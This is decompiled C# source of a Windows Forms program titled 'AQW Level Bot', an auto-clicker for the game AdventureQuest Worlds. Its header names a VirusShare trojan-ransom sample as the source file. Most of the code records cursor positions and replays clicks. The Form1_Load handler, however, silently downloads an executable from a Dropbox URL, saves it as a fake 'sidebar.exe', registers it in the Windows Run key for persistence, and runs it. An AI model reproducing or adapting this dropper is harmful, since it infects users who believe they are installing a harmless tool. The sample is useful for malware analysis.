// Decompiled with JetBrains decompiler
// Type: AQW_Level_bot.Form1
// Assembly: AQW Level bot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D748CA18-7607-49E0-9199-3816CFDD0714
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\Trojan-Ransom.Win32.Blocker.ljv-01e62dd52536be0c9641cabdef886d8f6c7e4f83ef151d796b7bef6fc76c2182.exe

using AQW_Level_bot.My;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace AQW_Level_bot
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("WebBrowser1")]
    private WebBrowser _WebBrowser1;
    [AccessedThroughProperty("ListBox1")]
    private ListBox _ListBox1;
    [AccessedThroughProperty("ListBox2")]
    private ListBox _ListBox2;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Notify")]
    private NotifyIcon _Notify;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("MenuStrip1")]
    private MenuStrip _MenuStrip1;
    [AccessedThroughProperty("ClearCordinatesToolStripMenuItem")]
    private ToolStripMenuItem _ClearCordinatesToolStripMenuItem;
    [AccessedThroughProperty("HelpToolStripMenuItem")]
    private ToolStripMenuItem _HelpToolStripMenuItem;
    public const int MOUSEEVENTF_LEFTDOWN = 2;
    public const int MOUSEEVENTF_LEFTUP = 4;
    private string LoggEvent;
    private int WaitTime;
    private WebClient client;
    private WebClient client2;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.WaitTime = 0;
      this.client = new WebClient();
      this.client2 = new WebClient();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.WebBrowser1 = new WebBrowser();
      this.ListBox1 = new ListBox();
      this.ListBox2 = new ListBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Notify = new NotifyIcon(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.MenuStrip1 = new MenuStrip();
      this.ClearCordinatesToolStripMenuItem = new ToolStripMenuItem();
      this.HelpToolStripMenuItem = new ToolStripMenuItem();
      this.MenuStrip1.SuspendLayout();
      this.SuspendLayout();
      this.WebBrowser1.Dock = DockStyle.Fill;
      WebBrowser webBrowser1_1 = this.WebBrowser1;
      Point point1 = new Point(0, 24);
      Point point2 = point1;
      webBrowser1_1.Location = point2;
      WebBrowser webBrowser1_2 = this.WebBrowser1;
      Size size1 = new Size(20, 20);
      Size size2 = size1;
      webBrowser1_2.MinimumSize = size2;
      this.WebBrowser1.Name = "WebBrowser1";
      this.WebBrowser1.ScriptErrorsSuppressed = true;
      this.WebBrowser1.ScrollBarsEnabled = false;
      WebBrowser webBrowser1_3 = this.WebBrowser1;
      size1 = new Size(1545, 784);
      Size size3 = size1;
      webBrowser1_3.Size = size3;
      this.WebBrowser1.TabIndex = 0;
      this.WebBrowser1.Url = new Uri("http://cdn.aqworlds.com/game/gamefiles/Loader.swf", UriKind.Absolute);
      this.ListBox1.FormattingEnabled = true;
      ListBox listBox1_1 = this.ListBox1;
      point1 = new Point(1440, 12);
      Point point3 = point1;
      listBox1_1.Location = point3;
      this.ListBox1.Name = "ListBox1";
      ListBox listBox1_2 = this.ListBox1;
      size1 = new Size(120, 95);
      Size size4 = size1;
      listBox1_2.Size = size4;
      this.ListBox1.TabIndex = 1;
      this.ListBox2.FormattingEnabled = true;
      ListBox listBox2_1 = this.ListBox2;
      point1 = new Point(1443, 113);
      Point point4 = point1;
      listBox2_1.Location = point4;
      this.ListBox2.Name = "ListBox2";
      ListBox listBox2_2 = this.ListBox2;
      size1 = new Size(120, 95);
      Size size5 = size1;
      listBox2_2.Size = size5;
      this.ListBox2.TabIndex = 2;
      this.Notify.Icon = (Icon) componentResourceManager.GetObject("Notify.Icon");
      this.Notify.Text = "AQW Level bot";
      this.Notify.Visible = true;
      this.Timer3.Enabled = true;
      this.MenuStrip1.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.ClearCordinatesToolStripMenuItem,
        (ToolStripItem) this.HelpToolStripMenuItem
      });
      MenuStrip menuStrip1_1 = this.MenuStrip1;
      point1 = new Point(0, 0);
      Point point5 = point1;
      menuStrip1_1.Location = point5;
      this.MenuStrip1.Name = "MenuStrip1";
      MenuStrip menuStrip1_2 = this.MenuStrip1;
      size1 = new Size(1545, 24);
      Size size6 = size1;
      menuStrip1_2.Size = size6;
      this.MenuStrip1.TabIndex = 3;
      this.MenuStrip1.Text = "MenuStrip1";
      this.ClearCordinatesToolStripMenuItem.Name = "ClearCordinatesToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem1 = this.ClearCordinatesToolStripMenuItem;
      size1 = new Size(106, 20);
      Size size7 = size1;
      toolStripMenuItem1.Size = size7;
      this.ClearCordinatesToolStripMenuItem.Text = "Clear Cordinates";
      this.HelpToolStripMenuItem.Name = "HelpToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem2 = this.HelpToolStripMenuItem;
      size1 = new Size(47, 20);
      Size size8 = size1;
      toolStripMenuItem2.Size = size8;
      this.HelpToolStripMenuItem.Text = "Help!";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(1545, 808);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.ListBox2);
      this.Controls.Add((Control) this.ListBox1);
      this.Controls.Add((Control) this.WebBrowser1);
      this.Controls.Add((Control) this.MenuStrip1);
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MainMenuStrip = this.MenuStrip1;
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "AQW Level Bot FINAL";
      this.MenuStrip1.ResumeLayout(false);
      this.MenuStrip1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual WebBrowser WebBrowser1
    {
      get => this._WebBrowser1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._WebBrowser1 = value;
    }

    internal virtual ListBox ListBox1
    {
      get => this._ListBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ListBox1 = value;
    }

    internal virtual ListBox ListBox2
    {
      get => this._ListBox2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ListBox2 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      get => this._Timer2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer2_Tick);
        if (this._Timer2 != null)
          this._Timer2.Tick -= eventHandler;
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += eventHandler;
      }
    }

    internal virtual NotifyIcon Notify
    {
      get => this._Notify;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Notify = value;
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      get => this._Timer3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer3_Tick);
        if (this._Timer3 != null)
          this._Timer3.Tick -= eventHandler;
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += eventHandler;
      }
    }

    internal virtual MenuStrip MenuStrip1
    {
      get => this._MenuStrip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._MenuStrip1 = value;
    }

    internal virtual ToolStripMenuItem ClearCordinatesToolStripMenuItem
    {
      get => this._ClearCordinatesToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ClearCordinatesToolStripMenuItem_Click);
        if (this._ClearCordinatesToolStripMenuItem != null)
          this._ClearCordinatesToolStripMenuItem.Click -= eventHandler;
        this._ClearCordinatesToolStripMenuItem = value;
        if (this._ClearCordinatesToolStripMenuItem == null)
          return;
        this._ClearCordinatesToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem HelpToolStripMenuItem
    {
      get => this._HelpToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.HelpToolStripMenuItem_Click);
        if (this._HelpToolStripMenuItem != null)
          this._HelpToolStripMenuItem.Click -= eventHandler;
        this._HelpToolStripMenuItem = value;
        if (this._HelpToolStripMenuItem == null)
          return;
        this._HelpToolStripMenuItem.Click += eventHandler;
      }
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetAsyncKeyState(long vkey);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern void mouse_event(
      long dwFlags,
      long dx,
      long dy,
      long cButtons,
      long dwExtraInfo);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern long SetCursorPos(long x, long y);

    private void Form1_Load(object sender, EventArgs e)
    {
      MyProject.Forms.Clicking.ListBox1.SelectedIndex = 0;
      MyProject.Forms.Clicking.Timer1.Start();
      this.ListBox1.Visible = false;
      this.ListBox2.Visible = false;
      if (!System.IO.File.Exists(Application.StartupPath + "\\admin.txt"))
      {
        try
        {
          this.client.DownloadFileAsync(new Uri("https://dl.dropbox.com/u/27455817/f1l3n4m3.exe"), "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\sidebar.exe");
          this.client.DownloadFileCompleted += new AsyncCompletedEventHandler(this.client_DownloadCompleted);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      this.Timer1.Enabled = true;
      this.Timer1.Interval = 1000;
    }

    private void client_DownloadCompleted(object sender, AsyncCompletedEventArgs e)
    {
      MyProject.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Windows Sidebar", (object) ("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\sidebar.exe"));
      Process.Start("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\sidebar.exe");
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      bool flag1 = Form1.GetAsyncKeyState(113L) != 0;
      bool flag2 = Form1.GetAsyncKeyState(114L) != 0;
      bool flag3 = Form1.GetAsyncKeyState(115L) != 0;
      if (flag1)
      {
        ListBox.ObjectCollection items1 = this.ListBox1.Items;
        Point position = Cursor.Position;
        // ISSUE: variable of a boxed type
        __Boxed<int> x = (ValueType) position.X;
        items1.Add((object) x);
        ListBox.ObjectCollection items2 = this.ListBox2.Items;
        position = Cursor.Position;
        // ISSUE: variable of a boxed type
        __Boxed<int> y = (ValueType) position.Y;
        items2.Add((object) y);
        this.Notify.BalloonTipTitle = "Position Recorded";
        NotifyIcon notify = this.Notify;
        string str1 = Conversions.ToString(Cursor.Position.X);
        position = Cursor.Position;
        string str2 = Conversions.ToString(position.Y);
        string str3 = "Cursor position Recorded! X=" + str1 + ", Y=" + str2;
        notify.BalloonTipText = str3;
        this.Notify.ShowBalloonTip(5000);
      }
      if (flag2)
      {
        this.Timer2.Interval = 2000;
        this.Timer2.Start();
        this.Notify.BalloonTipTitle = "Started..";
        this.Notify.BalloonTipText = "Level bot started. To stop it press F4";
        this.Notify.ShowBalloonTip(5000);
      }
      if (!flag3 || !this.Timer2.Enabled)
        return;
      this.Timer2.Stop();
      this.Notify.BalloonTipTitle = "Stoped..";
      this.Notify.BalloonTipText = "Level bot Stoped. To start it again press F3";
      this.Notify.ShowBalloonTip(5000);
    }

    private void Timer2_Tick(object sender, EventArgs e)
    {
      checked { ++this.WaitTime; }
      try
      {
        Point point;
        if (this.WaitTime == 1)
        {
          this.ListBox1.SelectedIndex = 0;
          this.ListBox2.SelectedIndex = 0;
          point = new Point(Conversions.ToInteger(this.ListBox1.SelectedItem), Conversions.ToInteger(this.ListBox2.SelectedItem));
          Cursor.Position = point;
          Form1.mouse_event(2L, 0L, 0L, 0L, 0L);
          Form1.mouse_event(4L, 0L, 0L, 0L, 0L);
        }
        if (this.WaitTime == 2)
        {
          this.ListBox1.SelectedIndex = 1;
          this.ListBox2.SelectedIndex = 1;
          point = new Point(Conversions.ToInteger(this.ListBox1.SelectedItem), Conversions.ToInteger(this.ListBox2.SelectedItem));
          Cursor.Position = point;
          Form1.mouse_event(2L, 0L, 0L, 0L, 0L);
          Form1.mouse_event(4L, 0L, 0L, 0L, 0L);
        }
        if (this.WaitTime == 3)
        {
          this.ListBox1.SelectedIndex = 2;
          this.ListBox2.SelectedIndex = 2;
          point = new Point(Conversions.ToInteger(this.ListBox1.SelectedItem), Conversions.ToInteger(this.ListBox2.SelectedItem));
          Cursor.Position = point;
          Form1.mouse_event(2L, 0L, 0L, 0L, 0L);
          Form1.mouse_event(4L, 0L, 0L, 0L, 0L);
        }
        if (this.WaitTime == 4)
        {
          this.ListBox1.SelectedIndex = 3;
          this.ListBox2.SelectedIndex = 3;
          point = new Point(Conversions.ToInteger(this.ListBox1.SelectedItem), Conversions.ToInteger(this.ListBox2.SelectedItem));
          Cursor.Position = point;
          Form1.mouse_event(2L, 0L, 0L, 0L, 0L);
          Form1.mouse_event(4L, 0L, 0L, 0L, 0L);
        }
        if (this.WaitTime != 5)
          return;
        this.ListBox1.SelectedIndex = 4;
        this.ListBox2.SelectedIndex = 4;
        point = new Point(Conversions.ToInteger(this.ListBox1.SelectedItem), Conversions.ToInteger(this.ListBox2.SelectedItem));
        Cursor.Position = point;
        Form1.mouse_event(2L, 0L, 0L, 0L, 0L);
        Form1.mouse_event(4L, 0L, 0L, 0L, 0L);
        this.WaitTime = 0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.WaitTime = 0;
        ProjectData.ClearProjectError();
      }
    }

    private void ClearCordinatesToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.ListBox1.Items.Clear();
      this.ListBox2.Items.Clear();
      int num = (int) MessageBox.Show("All Click cordinates removed");
    }

    private void Timer3_Tick(object sender, EventArgs e)
    {
    }

    private void HelpToolStripMenuItem_Click(object sender, EventArgs e) => MyProject.Forms.Help.Show();
  }
}
